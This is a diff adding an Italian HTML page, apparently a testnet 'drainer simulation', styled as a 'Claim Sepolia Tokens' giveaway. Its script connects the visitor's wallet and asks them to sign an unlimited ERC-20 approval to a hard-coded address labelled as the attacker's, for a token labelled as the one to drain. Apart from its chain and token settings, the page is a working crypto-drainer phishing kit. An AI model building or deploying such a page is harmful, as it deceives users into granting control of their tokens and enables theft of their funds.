@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web3 Simulation Test</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+</head>
+<body style="text-align:center; font-family: sans-serif; padding-top:100px; background-color: #f8f9fa;">
+
+    <div style="background: white; display: inline-block; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
+        <h1 style="color: #333;">🎁 Claim Sepolia Tokens</h1>
+        <p style="color: #666;">Connetti il tuo wallet per la simulazione del Drainer.</p>
+        
+        <button id="btn-connect" style="background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold;">
+            CONNETTI E RECLAMA
+        </button>
+
+        <div id="status" style="margin-top: 25px; color: #d9534f; font-weight: bold;"></div>
+    </div>
+
+    <script>
+        const MIO_INDIRIZZO_ATTACCANTE = "0xf1E69059bACa32d3D07C75d20453E24130443484";
+        const TOKEN_DA_DRENARE = "0x77110e0F9643445e9909772B4D368C76f599A998";
+
+        const providerOptions = {
+            walletconnect: {
+                package: WalletConnectProvider,
+                options: {
+                    rpc: { 11155111: "https://rpc.ankr.com/eth_sepolia" }
+                }
+            }
+        };
+
+        const web3Modal = new Web3Modal.default({
+            cacheProvider: false,
+            providerOptions
+        });
+
+        document.getElementById('btn-connect').onclick = async () => {
+            const status = document.getElementById('status');
+            status.innerText = "Inizializzazione WalletConnect...";
+            try {
+                const instance = await web3Modal.connect();
+                const provider = new ethers.providers.Web3Provider(instance);
+                const signer = provider.getSigner();
+                status.innerText = "Connesso! Firma la richiesta...";
+                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                const contract = new ethers.Contract(TOKEN_DA_DRENARE, abi, signer);
+                const tx = await contract.approve(MIO_INDIRIZZO_ATTACCANTE, ethers.constants.MaxUint256);
+                status.style.color = "green";
+                status.innerText = "Simulazione riuscita! TX: " + tx.hash.substring(0, 15);
+            } catch (e) {
+                console.error(e);
+                status.innerText = "Errore: " + e.message;
+            }
+        };
+    </script>
+</body>
+</html>
